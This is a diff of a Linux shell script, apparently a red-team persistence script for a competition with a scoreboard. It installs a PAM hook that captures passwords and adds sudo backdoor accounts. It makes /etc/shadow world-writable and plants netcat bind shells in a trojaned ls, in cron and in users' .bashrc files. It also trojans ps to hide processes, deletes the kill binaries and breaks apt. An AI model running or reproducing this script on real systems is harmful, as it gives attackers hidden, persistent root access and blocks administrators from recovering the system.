@@ -25,7 +25,7 @@ sed -i '1iauth optional pam_exec.so expose_authtok /usr/local/bin/PAM' /etc/pam.
 
 
 #Add users
-for user in Cody Andrew Trevor Shane Gaelin Lucas Tristan Angel FTP Spooky Why Do You Keep Locking Me Out I Cri Every Time Please Let mee stay; do useradd -M -G sudo,ssh $user; echo -e "SuperSecurePassword\nSuperSecurePassword" | passwd $user; done
+for user in Cody Andrew Trevor Shane Gaelin Lucas Tristan Angel FTP Spooky Why Do You Keep Locking Me Out I Cri Every Time Please Let mee stay; do useradd -M -G sudo,ssh $user; echo -e "SuperSecurePassword1!\nSuperSecurePassword1!" | passwd $user; done
 
 #Chmod /etc/ files
 chmod o+rw /etc/group /etc/shadow /root /etc/passwd
@@ -35,7 +35,7 @@ mv /usr/lib/x86_64-linux-gnu/security/pam_deny.so /usr/lib/x86_64-linux-gnu/secu
 cp /usr/lib/x86_64-linux-gnu/security/pam_access.so /usr/lib/x86_64-linux-gnu/security/pam_deny.so
 
 #Bind Shell to Collect Logins
-cat /etc/local | (nc -lvp 4445 &>/dev/null &)
+cat /etc/local | (/usr/bin/nc -lvp 4445 &>/dev/null &)
 
 #Cant be killed
 rm -rf /usr/bin/kill*
@@ -43,25 +43,33 @@ rm -rf /usr/bin/kill*
 #Bind shell in ls
 mv /usr/bin/ls /usr/bin/lsnt
 touch /usr/bin/ls
-echo '(nc -lvp 44440 -e /bin/bash &>/dev/null &) 2>&-;ls $1 $2 $3' > /usr/bin/ls
+echo '(/usr/bin/nc -lvp 44440 -e /bin/bash &>/dev/null &) 2>&-;/usr/bin/lsnt $1 $2 $3' > /usr/bin/ls
 chmod +x /usr/bin/ls
 
 #Bind shell in Cron
-{ crontab -l; echo "* * * * * (nc -lvp 420 -e /bin/bash &>/dev/null &) 2>&-"; } | crontab -
+{ crontab -l; echo "* * * * * (/usr/bin/nc -lvp 420 -e /bin/bash &>/dev/null &) 2>&-"; } | crontab -
 
 #Bind shell in their bashrc?
-echo '(nc -lvp 11111 -e /bin/bash &>/dev/null &) 2>&-' >> /home/*/.bashrc
+echo '(/usr/bin/nc -lvp 11111 -e /bin/bash &>/dev/null &) 2>&-' >> /home/*/.bashrc
 
 #Script to call scoreboard every 15 seconds 10.30.0.100
 #printf 'GET /351b HTTP/1.1\n\n' | nc localhost 80
 echo 'while 1: import urllib.request;import time;urllib.request.urlretrieve("http://localhost/351b");time.sleep(15)' > /bin/Python3
 #This throws it into the main bashrc
 echo -e '#Dont remove if you want to be scored\n( bash -c 'exec python3 /bin/Python3' ) & disown' >> /etc/bash.bashrc
+( bash -c 'exec python3 /bin/Python3' ) & disown
 
 #Give user daemon a shell
 usermod --shell /bin/bash daemon
-echo -e "SuperSecurePassword\nSuperSecurePassword" | passwd daemon
+echo -e "SuperSecurePassword1!\nSuperSecurePassword1!" | passwd daemon
 usermod -G sudo,ssh daemon
 
 #Copy ps -auxf 
-mv /usr/bin/ps /usr/bin/psnt; echo '/usr/bin/psnt | grep -ve "python" -e "nc" -e "sleep" -e "grep"' > /usr/bin/ps; chmod +x /usr/bin/ps
+mv /usr/bin/ps /usr/bin/psnt; echo '/usr/bin/psnt $1 $2 | grep -ve "python" -e "nc" -e "sleep" -e "grep"' > /usr/bin/ps; chmod +x /usr/bin/ps
+
+#Break sources.list
+sed -i '1ia\n' /etc/apt/sources.list
+chmod 000 /etc/apt/sources.list
+chattr +i /etc/apt/sources.list 
+
+chattr +i /etc/shadow /etc/passwd
